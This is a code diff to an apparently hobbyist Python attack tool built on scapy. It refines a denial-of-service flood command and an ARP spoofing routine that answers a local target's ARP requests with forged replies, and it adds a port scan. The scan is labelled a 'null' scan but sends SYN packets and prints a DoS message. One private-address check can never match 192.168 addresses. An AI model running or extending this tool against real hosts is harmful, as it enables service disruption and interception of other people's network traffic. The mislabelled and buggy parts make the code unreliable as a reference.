@@ -3,6 +3,7 @@ import socket
 import pythonping
 from scapy.all import *
 from scapy.layers.l2 import ARP
+from scapy.layers.inet import TCP, IP
 
 LOGO = r"""
   /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$              /$$$$$$ /$$$$$$$  /$$$$$$$   /$$$$$$ 
@@ -50,27 +51,29 @@ def get_command() -> str:
 
 
 def handle_attack(args: list[str]):
-    if len(args) == 0:
+    if len(args) != 2:
         print('Invalid usage, see "help"')
         return
+
+    target = resolve_target(args[1])
+    if target == "":
+        return  # Already prints an error message
 
     match args[0]:
         case "ddos":
             if len(args) != 2:
                 print('Invalid usage, see "help"')
                 return
-            commit_ddos(args[1])
+            commit_ddos(target)
         case "arp":
-            commit_arp_spoofing(args[1])
+            commit_arp_spoofing(target)
+        case "tcp" | "null":
+            commit_null_tcp_scan(target)
         case _:
             print('Attack not supported! Use "help" to learn more')
 
 
 def commit_ddos(target: str):
-    target = resolve_target(target)
-    if target == "":
-        return  # Already prints an error message
-
     print('Committing DoS, press CTRL+C at any moment to stop.')
     try:
         while True:
@@ -83,15 +86,21 @@ def commit_ddos(target: str):
         print("An exception occurred, abandoning attack.")
 
 
+# Receives a VALID IP address!
 def is_local(ip: str) -> bool:
     ip_bytes = ip.split('.')
-    return ip_bytes[0] == '10' or ip_bytes[0:1] == ['192.168'] or (ip_bytes[0] == '172' and 16 <= ip_bytes[1] <= 31)
+    return ip_bytes[0] == '10' or ip_bytes[0:1] == ['192.168'] \
+        or (ip_bytes[0] == '172' and 16 <= int(ip_bytes[1]) <= 31)
 
 
 def commit_arp_spoofing(target: str):
+    if not is_local(target):
+        print('Invalid use, please enter a private ip')
+        return
+
     def packet_handler(packet):
         arp = packet[ARP]
-        if arp.op != 1 or arp.psrc != target: # Insuring that the packet is relevant
+        if arp.op != 1 or arp.psrc != target: # Ensuring that the packet is relevant
             return
         send(ARP(op=2,
                  psrc=get_if_addr(conf.iface),
@@ -100,12 +109,24 @@ def commit_arp_spoofing(target: str):
                  hwdst=arp.hwsrc
                  ))
 
-    if not is_local(target):
-        print('Invalid use, please enter a private ip')
-        return
     print('Committing ARP spoofing, press CTRL+C at any moment to stop.')
     sniff(prn=packet_handler, promisc=True, store=False, filter='arp')
 
+
+def commit_null_tcp_scan(target: str):
+    print('Committing DoS, press CTRL+C at any moment to stop.')
+    try:
+        for port in range(1, 1025):  # Scan first 1024 ports
+            resp = sr1(IP(src=get_if_addr(conf.iface), dst=target) / TCP(dport=port, flags="S"), timeout=1)
+            if resp:
+                if resp[TCP].flags == 0x12:  # SYN+ACK
+                    print(f"Port {port} is open")
+                elif resp[TCP].flags == 0x14:  # RST
+                    print(f"Port {port} is closed")
+            else:
+                print(f"Port {port} is filtered or closed")
+    except (KeyboardInterrupt, InterruptedError):
+        print("\nAttack Terminated.")
 
 # Returns whether to continue or not
 def handle_command(cmd: list[str]) -> bool:
@@ -133,7 +154,7 @@ def main():
     try:
         while handle_command(get_command().split()):
             pass
-    except KeyboardInterrupt:
+    except (KeyboardInterrupt, UnicodeDecodeError):
         print()  # Newline for bye message
 
     print("\nBye bye!")
